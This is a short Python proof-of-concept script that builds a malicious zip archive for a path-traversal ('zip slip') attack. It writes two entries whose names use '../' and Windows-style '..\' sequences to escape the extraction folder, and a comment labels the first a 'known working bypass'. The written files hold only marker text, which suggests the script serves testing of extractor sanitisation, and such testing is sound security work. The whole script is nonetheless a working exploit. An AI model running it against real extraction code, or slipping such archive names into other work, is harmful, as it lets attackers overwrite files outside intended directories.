import zipfile
with zipfile.ZipFile('evil.zip', 'w') as z:
    # linux mid-path (known working bypass)
    z.writestr('d/../../ESCAPED-LINUX.txt', 'POISONED-MIDPATH-FORWARD-SLASH')
    # windows backslash mid-path (entry separators are backslashes)
    z.writestr('w\\..\\..\\ESCAPED-WIN.txt', 'POISONED-MIDPATH-BACKSLASH')
print('zip written')
